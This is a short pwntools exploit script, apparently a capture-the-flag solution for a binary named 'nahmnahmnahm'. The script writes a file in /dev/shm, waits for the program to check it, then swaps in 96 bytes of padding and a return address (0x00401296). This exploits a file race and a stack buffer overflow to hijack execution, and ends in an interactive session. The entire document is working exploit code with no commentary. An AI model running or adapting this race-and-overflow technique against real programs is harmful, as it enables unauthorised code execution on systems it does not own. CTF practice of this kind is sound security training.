#!/usr/bin/env python3

from pwn import *
import os

r = process("./nahmnahmnahm")

with open("/dev/shm/chef", "x") as file:
    file.write("chef")
    file.close()

pause()

with open("/dev/shm/chef", 'wb') as file:
    r.sendlineafter(":", "/dev/shm/chef")
    r.recvuntil(":")
    file.write(b"A"*96)
    file.write(p64(0))
    file.write(p64(0x00401296))
    file.close()

r.interactive()

os.system("rm /dev/shm/chef")
